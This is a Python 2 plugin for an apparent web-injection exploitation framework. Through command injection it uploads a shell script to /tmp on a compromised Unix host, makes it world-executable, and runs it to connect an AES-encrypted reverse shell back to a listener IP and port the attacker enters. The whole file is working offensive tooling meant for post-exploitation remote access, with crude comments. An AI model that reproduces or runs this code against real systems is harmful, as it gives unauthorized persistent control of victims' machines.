# Uses AES http backdoor
import os
from plugininterface import basePlugin
import inspect
import time

class aeshttp(basePlugin):

    def plugin_init(self):
        pass
        
    def plugin_loaded(self):
        pass

    def request_parameters(self):
	    pass
        
     
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        # This method will be called just befor the user gets the 'available attack' screen.
        # You can see that we get the 
        #     * langClass (which represents the current language of the script)
        #     * A boolean value 'isSystem' which tells us if we can inject system commands.
        #     * And another boolean 'isUnix' which will be true if it's a unix-like system and false if it's Windows.
        # We should return a array which contains tuples with a label and a unique callback string.
        ret = []

        #print "Language: " + langClass.getName()
        
        if (isSystem):
            attack = ("Uploads and runs an AES HTTP Reverse shell", "aeshttp.aeshttp")
            ret.append(attack)
        
        return(ret)	
        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        # This function will be launched if the user selected one of your attacks.
        # The two params you receive here are:
        #    * callbackstring - The string you have defined in plugin_exploit_modes_requested.
        #    * haxhelper - A little class which makes it very easy to send an injected command.
        
        if (callbackstring == "aeshttp.aeshttp"):
            
            if (haxhelper.isUnix()):
		shell_path= "%s/shells" % os.path.dirname(inspect.getfile(inspect.currentframe()))

		os.chdir(shell_path)
		if not os.path.isfile("./shell.py"):
			print "The fuck is the shell?"
			print "quitting"
			return 1

		self.request_parameters()
		remoten="/tmp/shell.py"

		print "Uploading shell to %s  ..." % remoten
		bytes = haxhelper.uploadfile("./shell.py", remoten, chunksize=-1) #BUGFIXXXX
		print "Uploaded %s bytes" % bytes
		haxhelper.executeSystemCommand("chmod 777 %s" % remoten)
		print "Hope you have the listener running... Time to input your infoes :)"
		reverseip = raw_input("IP of listener?: ")
		reverseport = raw_input("Port of listener?: ")
		haxhelper.executeSystemCommand("python /tmp/shell.py %s %s" %(reverseip, reverseport))
		print "Executing the shell! Sending reverse shell to %s %s" %(reverseip, reverseport)
